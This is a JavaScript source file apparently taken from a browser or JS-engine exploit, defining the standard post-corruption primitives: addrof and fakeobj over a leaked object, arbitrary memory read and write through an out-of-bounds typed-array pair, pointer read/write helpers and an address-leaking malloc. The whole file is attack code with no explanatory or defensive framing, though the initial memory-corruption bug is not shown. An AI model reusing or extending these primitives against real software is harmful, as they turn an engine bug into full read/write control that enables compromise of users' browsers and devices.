function i48Write(value, dest) {
    dest[4] = value | 0;                // Store the lower 32 bits of the value in dest[4]
    dest[5] = (value / 4294967296) | 0; // Store the upper 32 bits of the value in dest[5]
}

// The lower 32 bits are retrieved from src[4] and the upper 32 bits from src[5]
// The combined value is then reconstructed by multiplying the upper bits by 2^32 (4294967296) and adding the lower bits
function i48Read(src) {
    return src[4] + src[5] * 4294967296;
}

// addrof primitive
function addrof(x) {
  leaker_obj.a = x;
  return i48Read(leaker_arr);
}
// fakeobj primitive
function fakeobj(x) {
  i48Write(x, leaker_arr);
  return leaker_obj.a;
}

function read_mem_setup(p, sz) {
  i48Write(p, oob_master);
  oob_master[6] = sz;
}

function read_mem(p, sz) {
  printf("%d bytes read from %x", sz, p);
  read_mem_setup(p, sz);
  return Array.from(oob_slave.slice(0, sz));
}

function write_mem(p, data) {
  let size = data.length;
  i48Write(p, oob_master);
  oob_master[6] = size;
  oob_slave.set(data);
  printf("%d bytes written to %x", size, p);
}
function read_mem_as_string(p, sz) {
  let bytes = read_mem(p, sz);
  if (bytes.length === sz) {
    printf("%d bytes read and converted to text", sz);
    let plain = String.fromCharCode(...bytes);
    bytes = null;
    return plain;
  }
  printf("bytes read dont match requested size");
  bytes = null;
  return null;
}
function read_mem_s(p, sz) {
  read_mem_setup(p, sz);
  return `${oob_slave}`;
}

function read_mem_b(p, sz) {
  read_mem_setup(p, sz);
  return oob_slave.slice(0, sz);
}

function read_ptr_at(addr) {
  let result = 0;
  let readData = read_mem(addr, 8);
  for (let i = 7; i >= 0; i--) {
    result *= 256;
    result += readData[i];
  }
  return result;
}

function write_ptr_at(addr, data) {
  let arr = [];
  for (let i = 0; i < 8; i++) {
    arr.push(data & 255);
    data /= 256;
  }
  write_mem(addr, arr);
}
const hex = (x) => "0x" + x.toString(16);

var malloc_nogc = [];
function malloc(sz) {
  let arr = new Uint8Array(sz);
  malloc_nogc.push(arr);
  return read_ptr_at(addrof(arr) + 0x10);
}
